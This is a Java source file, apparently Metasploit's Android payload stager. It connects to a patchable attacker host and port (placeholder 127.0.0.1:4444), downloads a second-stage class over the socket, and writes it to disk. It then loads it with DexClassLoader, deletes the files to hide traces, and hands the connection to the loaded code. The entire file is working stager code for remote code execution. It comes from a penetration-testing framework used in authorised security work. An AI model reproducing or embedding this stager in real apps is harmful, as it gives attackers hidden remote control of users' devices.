package com.metasploit.stage;

import android.content.Context;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.Socket;

import dalvik.system.DexClassLoader;

public class Payload {

    private static final String LHOST = "XXXX127.0.0.1                       ";
    private static final String LPORT = "YYYY4444                            ";

    public static Context context;

    public static void start() {
        Context context = null;
        try {
            final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            final Method method = activityThreadClass.getMethod("currentApplication");
            context = (Context) method.invoke(null, (Object[]) null);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Set the working directory somewhere writeable
        System.setProperty("user.dir", context.getFilesDir().getAbsolutePath());

        // Store the context
        Payload.context = context.getApplicationContext();

        startAsync();
    }

    public static void startAsync() {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main(null);
            }
        }.start();
    }

    public static void main(String[] args) {
        try {
            String lhost = LHOST.substring(4).trim();
            String lport = LPORT.substring(4).trim();
            Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
            DataInputStream in = new DataInputStream(msgsock.getInputStream());
            OutputStream out = new DataOutputStream(msgsock.getOutputStream());

            String path = new File(".").getAbsolutePath();
            String filePath = path + File.separatorChar + "payload.jar";
            String dexPath = path + File.separatorChar + "payload.dex";

            // Read the class name
            int coreLen = in.readInt();
            byte[] core = new byte[coreLen];
            in.readFully(core);
            String classFile = new String(core);

            // Read the stage
            coreLen = in.readInt();
            core = new byte[coreLen];
            in.readFully(core);

            File file = new File(filePath);
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fop = new FileOutputStream(file);
            fop.write(core);
            fop.flush();
            fop.close();

            // Load the stage
            DexClassLoader classLoader = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader());
            Class<?> myClass = classLoader.loadClass(classFile);
            final Object stage = myClass.newInstance();
            file.delete();
            new File(dexPath).delete();
            myClass.getMethod("start", new Class[]{
                    DataInputStream.class, OutputStream.class, Context.class, String[].class
            }).invoke(stage, new Object[]{
                    in, out, context, new String[] {},
            });

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

